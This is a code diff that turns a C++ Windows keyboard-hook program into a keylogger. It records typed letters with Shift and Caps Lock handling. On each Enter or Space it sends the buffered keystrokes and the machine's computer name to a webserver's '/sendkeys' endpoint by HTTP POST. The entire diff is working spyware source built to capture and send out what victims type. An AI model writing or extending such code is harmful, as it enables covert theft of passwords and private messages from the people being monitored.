@@ -1,11 +1,18 @@
-#include <windows.h>
 #include <iostream>
+#include "headers/HttpRequest.h"
+#include "headerSource/HttpRequest.cpp" // Custom Class made for building and sending HTTP POST requests to the webserver containing our keystrokes.
+#include <windows.h>
+#include <string>
 
-using namespace std;
+#ifndef UNICODE // Have to have this in order to make converting from TCHAR to std::string easy due to character encoding issues.
+typedef std::string String;
+#else
+typedef std::wstring String;
+#endif
 
 HHOOK keyboard;
 KBDLLHOOKSTRUCT keyboardstruct;
-bool CapsStatus = false;
+std::string keystrokes;
 
 LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
 {
@@ -14,15 +21,44 @@ LRESULT __stdcall Callback(int keyboardcode, WPARAM wParam, LPARAM lParam)
         keyboardstruct = *((KBDLLHOOKSTRUCT *)lParam);
         if (wParam == WM_KEYDOWN)
         {
-            if (GetKeyState(16) < 0)
+            if (keyboardstruct.vkCode == 13 || keyboardstruct.vkCode == 32)
             {
-                char c = MapVirtualKey(keyboardstruct.vkCode, 2);
-                cout << (char)toupper(c) << endl;
+                HttpRequest newRequest;
+                TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
+                DWORD nameLength = MAX_COMPUTERNAME_LENGTH + 1;
+                if (!GetComputerName(computerName, &nameLength))
+                {
+                    newRequest.setComputerName("Unknown");
+                }
+                else
+                {
+                    String temp = computerName;
+                    String temp2(temp.begin(), temp.end());
+                    newRequest.setComputerName(temp2);
+                }
+                newRequest.setKeystrokes(keystrokes);
+                newRequest.setMethod("POST");
+                newRequest.setUrl("/sendkeys");
+                newRequest.buildRequest();
+                newRequest.sendRequest();
+                keystrokes.clear();
             }
             else
             {
-                char c = MapVirtualKey(keyboardstruct.vkCode, 2);
-                cout << (char)tolower(c) << endl;
+                if(keyboardstruct.vkCode >= 0x30 && keyboardstruct.vkCode <= 0x5A){
+                    if (GetKeyState(16) < 0 || GetKeyState(VK_CAPITAL) == 1)
+                    {
+                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
+                        std::cout << c << std::endl;
+                        keystrokes.append(std::string(1, (char)toupper(c)));
+                    }
+                    else
+                    {
+                        char c = MapVirtualKey(keyboardstruct.vkCode, 2);
+                        std::cout << c << std::endl;
+                        keystrokes.append(std::string(1, (char)tolower(c)));
+                    }
+                }
             }
         }
     }
